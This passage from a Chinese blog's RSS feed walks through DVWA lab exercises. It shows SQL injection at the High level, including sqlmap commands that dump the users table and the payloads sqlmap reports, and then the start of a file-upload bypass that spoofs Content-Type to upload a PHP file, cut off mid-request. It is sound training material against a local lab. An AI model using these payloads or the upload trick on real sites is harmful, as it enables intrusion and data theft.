class="gallery-image"
data-flex-grow="138"
data-flex-basis="333px"
>&lt;/p>
&lt;p>High难度就比较怪了，从这个窗口输入1提交之后，页面直接刷新出了id对应的用户信息，这个交互是真没见过。接着审阅下源码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_SESSION&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get input
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_DVWA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;SQLI_DB&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">MYSQL&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// Check database
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SELECT first_name, last_name FROM users WHERE user_id = &amp;#39;&lt;/span>&lt;span class="si">$id&lt;/span>&lt;span class="s2">&amp;#39; LIMIT 1;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_query&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="k">or&lt;/span> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Something went wrong.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Get results
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_fetch_assoc&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$result&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Get values
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$first&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;first_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="nv">$last&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$row&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;last_name&amp;#34;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="c1">// Feedback for end user
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;ID: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;First name: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$first&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;br /&amp;gt;Surname: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$last&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">((&lt;/span>&lt;span class="nx">is_null&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$___mysqli_res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">mysqli_close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$GLOBALS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;___mysqli_ston&amp;#34;&lt;/span>&lt;span class="p">])))&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="k">false&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$___mysqli_res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">SQLITE&lt;/span>&lt;span class="o">:&lt;/span>
&lt;span class="c1">// 略 ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>立刻注意到 &lt;code>$_SESSION['id']&lt;/code>，所以这个难度的注入点在会话信息中。此时考虑一个情况：会话保存在哪儿？Cookies 还是服务端？&lt;/p>
&lt;p>如果保存在服务端，那么此处就没有注入的可能，因为无法控制&lt;code>$_SESSION['id']&lt;/code>的值。先看一眼 Cookies 里有没有。&lt;/p>
&lt;blockquote>
&lt;p>事后反省：我又傻逼了。那个弹出的窗口就是让你控制 &lt;code>$_SESSION['id']&lt;/code>的。&lt;/p>
&lt;p>删除一段胡乱分析的内容。&lt;/p>
&lt;/blockquote>
&lt;p>&amp;hellip;.总之，先试试&lt;code>'&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418.png"
width="521"
height="243"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151241418_hu9e6afd571627e65157bd0ea1c6914aae_13769_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427151241418"
class="gallery-image"
data-flex-grow="214"
data-flex-basis="514px"
>&lt;/p>
&lt;p>很好，还是有注入的。&lt;/p>
&lt;p>接着试一试 Low 难度的 payload：&lt;code>' or 1=1 --&lt;/code>。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515.png"
width="408"
height="325"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427151343515_hu2769a150c5b6a4c878a2eaf3d044c857_9585_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427151343515"
class="gallery-image"
data-flex-grow="125"
data-flex-basis="301px"
>&lt;/p>
&lt;p>好了，我觉得不用继续了，剩下无非是把 Low 难度的 payload 重复一遍。&lt;/p>
&lt;h3 id="sqlmap">sqlmap&lt;/h3>
&lt;p>手工注入成功之后可以尝试下自动工具了。&lt;code>sqlmap&lt;/code> 是一个非常著名的自动SQL注入工具，这里拿 sqlmap 玩一玩。&lt;/p>
&lt;p>直接在虚拟机里安装 sqlmap &lt;code>sudo apt install -y sqlmap&lt;/code>，然后开始。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>经过一大串输出和询问如何测试之后，得到下面的报告：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
---
Parameter: id (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
Payload: id=1&amp;#39; OR NOT 4667=4667#&amp;amp;Submit=Submit
Type: error-based
Title: MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
Payload: id=1&amp;#39; AND EXTRACTVALUE(2744,CONCAT(0x5c,0x7170786b71,(SELECT (ELT(2744=2744,1))),0x71627a7171))-- HCVJ&amp;amp;Submit=Submit
Type: time-based blind
Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=1&amp;#39; AND (SELECT 7426 FROM (SELECT(SLEEP(5)))bhNh)-- bKjP&amp;amp;Submit=Submit
Type: UNION query
Title: MySQL UNION query (NULL) - 2 columns
Payload: id=1&amp;#39; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x64687569466e4454474c614e644e7543524f49417450684b547a506d65756c54576e56466255644a,0x71627a7171)#&amp;amp;Submit=Submit
---
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>sqlmap&lt;/code> 发现 &lt;code>id&lt;/code> 脆弱而且列出了三种攻击方式和对应的 payload，这里我使用的是 &lt;code>UNION query&lt;/code>法，前面所说的稳定的1比特观察窗口就是 &lt;code>boolean-based blind&lt;/code>，一种盲注攻击法。因为1比特的观察窗口虽然稳定但真的太小了，所以一般靠这个盲注的时候都是拿脚本跑（如上所示，比如用&lt;code>sqlmap&lt;/code>来跑）。&lt;/p>
&lt;p>更让人感到惊喜的是甚至给出了&lt;code>id&lt;/code>可能可以用于反射型XSS，可以说非常牛逼了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">heuristic (XSS) test shows that GET parameter &amp;#39;id&amp;#39; might be vulnerable to cross-site scripting (XSS) attacks
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过添加参数还可以枚举出更多信息。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span> --dbs --tables --columns
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093.png"
width="1119"
height="709"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153558093_hu37dcf5cebdc4dfb37dd7d8c84cf425bd_630384_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427153558093"
class="gallery-image"
data-flex-grow="157"
data-flex-basis="378px"
>&lt;/p>
&lt;p>一键列出表名和字段名！&lt;/p>
&lt;p>然后我们直接用 sqlmap 列出 &lt;code>dvwa.users&lt;/code> 这个表的内容。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sqlmap -u &lt;span class="s1">&amp;#39;http://localhost/vulnerabilities/sqli/?id=1&amp;amp;Submit=Submit#&amp;#39;&lt;/span> --cookie &lt;span class="s1">&amp;#39;PHPSESSID=9nmb4p6uqpf33edc0gvt0s38k5; security=low&amp;#39;&lt;/span> -D dvwa -T users --dump
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726.png"
width="1371"
height="439"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-06/image-20220427153909726_huee70106b164173b84d6e3d22dbf95277_726586_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220427153909726"
class="gallery-image"
data-flex-grow="312"
data-flex-basis="749px"
>&lt;/p>
&lt;p>完成。之后可能再专门学一学 sqlmap 可以怎么玩，DVWA 确实是个好靶场。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>SQL注入还算是熟悉一点，毕竟上初中那会儿就玩过了，就是那时候不懂事根本没细看。可惜了年轻的自己就是个傻逼啊。&lt;/p>
&lt;p>SQL注入没什么可总结的，熟悉SQL之后DVWA这种简单的注入是信手拈来的事情，连源码都给了，注不进去才奇怪。之后研究sqlmap的时候可能再看看都有什么注入技巧，说不定也是可以迁移到其他地方的。&lt;/p></description></item><item><title>DVWA上手记录-文件上传</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-05/</link><pubDate>Wed, 27 Apr 2022 12:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-05/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>快速过一下文件上传。老写一大串没用的这次简洁点。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;ol>
&lt;li>文件传到服务器上了。&lt;/li>
&lt;li>没做好文件类型过滤和执行权限的控制，传上来的文件包含恶意代码。&lt;/li>
&lt;/ol>
&lt;p>上传的恶意文件被执行，于是寄。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="收集信息">收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663.png"
width="683"
height="170"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663_hue5286accd807ff7366ef6801710a85b8_9725_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160039663_hue5286accd807ff7366ef6801710a85b8_9725_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160039663"
class="gallery-image"
data-flex-grow="401"
data-flex-basis="964px"
>&lt;/p>
&lt;p>一个文件上传表单，提示选择图片上传。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588.png"
width="609"
height="267"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588_hu0ba2627541bb845650f402518a23d6c4_26033_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160116588_hu0ba2627541bb845650f402518a23d6c4_26033_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160116588"
class="gallery-image"
data-flex-grow="228"
data-flex-basis="547px"
>&lt;/p>
&lt;p>点击选择文件发现前端就没过滤文件类型。随便选了个文件上传。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958.png"
width="503"
height="205"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958_hu572c7079dce176180ca2a8e7feb14b8e_10173_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160207958_hu572c7079dce176180ca2a8e7feb14b8e_10173_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160207958"
class="gallery-image"
data-flex-grow="245"
data-flex-basis="588px"
>&lt;/p>
&lt;p>&amp;hellip;行，直接寄了。&lt;/p>
&lt;h3 id="low难度">Low难度&lt;/h3>
&lt;p>看一眼代码，没有任何防护，逻辑清晰：取文件名，拼接到上传位置，然后把临时文件移动过去。就这样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">
&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接传一个 php 文件也不会拦，所以直接传个上去。就刚才的 1.php 好了。然后访问。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041.png"
width="1219"
height="351"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041_hu6f6561036a3ff7b7c05ab535fdf8f827_46824_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160503041_hu6f6561036a3ff7b7c05ab535fdf8f827_46824_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160503041"
class="gallery-image"
data-flex-grow="347"
data-flex-basis="833px"
>&lt;/p>
&lt;p>成功。&lt;/p>
&lt;h3 id="medium难度">Medium难度&lt;/h3>
&lt;p>前端没变化，看源码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;image/png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>主要变化出现在 &lt;code>if( ( $uploaded_type == &amp;quot;image/jpeg&amp;quot; || $uploaded_type == &amp;quot;image/png&amp;quot; ) &amp;amp;&amp;amp; ( $uploaded_size &amp;lt; 100000 ) )&lt;/code> 这段代码。&lt;code>uploaded_type&lt;/code> 是 &lt;code>$_FILES['uploaded']['type']&lt;/code>，查文档可知&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787.png"
width="1037"
height="92"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787_hue3efa660b46003a1cf4a113fe65bb9e4_21339_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-05/image-20220426160910787_hue3efa660b46003a1cf4a113fe65bb9e4_21339_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220426160910787"
class="gallery-image"
data-flex-grow="1127"
data-flex-basis="2705px"
>&lt;/p>
&lt;p>类型信息是由浏览器提供的，因此可以选择自己构造一个文件上传请求，改掉 Content-Type 之后发出去。偷懒直接把 Low 难度下的文件上传请求右键复制 fetch 出来（edge/chrome 对 &lt;code>multipart/form-data&lt;/code> 的请求不能复制出请求体，这一步只能用火狐），把复制出来的命令的 &lt;code>body&lt;/code> 里：&lt;/p>
&lt;ol>
&lt;li>&lt;code>Content-Type&lt;/code> 改成 &lt;code>image/jpeg&lt;/code>。&lt;/li>
&lt;li>文件名改成 &lt;code>2.php&lt;/code>，以区别于 Low 难度下的 &lt;code>1.php&lt;/code>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kr">await&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost:8080/vulnerabilities/upload/#&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;credentials&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;include&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;headers&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="s2">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;Accept-Language&amp;#34;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
